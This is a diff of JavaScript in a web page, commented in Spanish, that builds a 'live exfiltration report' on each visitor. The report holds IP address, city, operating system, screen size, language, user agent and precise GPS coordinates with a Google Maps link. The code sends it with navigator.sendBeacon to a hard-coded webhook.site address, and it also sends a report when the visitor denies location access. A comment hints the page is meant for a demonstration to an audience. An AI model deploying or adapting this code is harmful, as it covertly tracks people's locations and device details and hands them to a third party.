@@ -162,18 +162,55 @@
             };
 
             try {
+            // 1. Obtener datos de IP (Aproximados)
             let response = await fetch('https://ipapi.co/json/');
             let data = await response.json();
-            ipInfo = `${data.ip} (${data.city}, ${data.country_name})`;
-            datosExfiltracion.ip = data.ip;
-            datosExfiltracion.ubicacion = `${data.city}, ${data.country_name}`;
+            
+            let ipReal = data.ip;
+            let ubicacionReal = `${data.city}, ${data.country_name}`;
 
-            // MÉTODO A PRUEBA DE CORS: sendBeacon envía los datos de inmediato sin bloquearse
-            let urlWebhook = 'https://webhook.site/fbffaa70-2c9a-4a3a-95cc-f38e852e0ee4';
-            navigator.sendBeacon(urlWebhook, JSON.stringify(datosExfiltracion));
+            // 2. Función interna para enviar los datos a Webhook.site
+            // Esta función se llamará después de que el usuario responda a la alerta del GPS
+            const exfiltrarDatos = (coordenadasGps) => {
+                let reporteTexto = 
+                    "=== REPORTE DE EXFILTRACIÓN EN VIVO ===\n" +
+                    "• Sistema Operativo : " + ( /android/i.test(navigator.userAgent) ? "Android" : (/iPad|iPhone|iPod/.test(navigator.userAgent) ? "iOS" : "Escritorio/Genérico") ) + "\n" +
+                    "• Resolución Pantalla: " + `${window.screen.width}x${window.screen.height}` + "\n" +
+                    "• Dirección IP Pública: " + ipReal + "\n" +
+                    "• Ubicación IP (Aprox): " + ubicacionReal + "\n" +
+                    "• Coordenadas GPS Exac: " + coordenadasGps + "\n" +
+                    "• Idioma del Sistema : " + navigator.language + "\n" +
+                    "• User-Agent        : " + navigator.userAgent + "\n" +
+                    "========================================";
+
+                let urlWebhook = 'https://webhook.site/fbffaa70-2c9a-4a3a-95cc-f38e852e0ee4';
+                navigator.sendBeacon(urlWebhook, reporteTexto);
+            };
+
+            // 3. Solicitar permiso de GPS al usuario (Dispara la alerta del sistema)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Si el usuario presiona "Permitir"
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        // Generamos un enlace directo a Google Maps para asombrar a la audiencia
+                        let linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+                        exfiltrarDatos(`${lat}, ${lon}\n• Mapa en vivo      : ${linkMaps}`);
+                    },
+                    (error) => {
+                        // Si el usuario presiona "Bloquear" o cierra la ventana
+                        exfiltrarDatos("Permiso bloqueado por el usuario (Usuario Alerta)");
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                exfiltrarDatos("Navegador no soporta Geolocalización");
+            }
 
         } catch (e) {
-            ipInfo = "Oculta / Restringida por red";
+            let reporteError = "=== REPORTE BÁSICO ===\n• Estado: Red restringida o error de API IP";
+            navigator.sendBeacon('https://webhook.site/fbffaa70-2c9a-4a3a-95cc-f38e852e0ee4', reporteError);
         }
 
             // 3. Mostrar el reporte final en pantalla tras un pequeño retraso visual
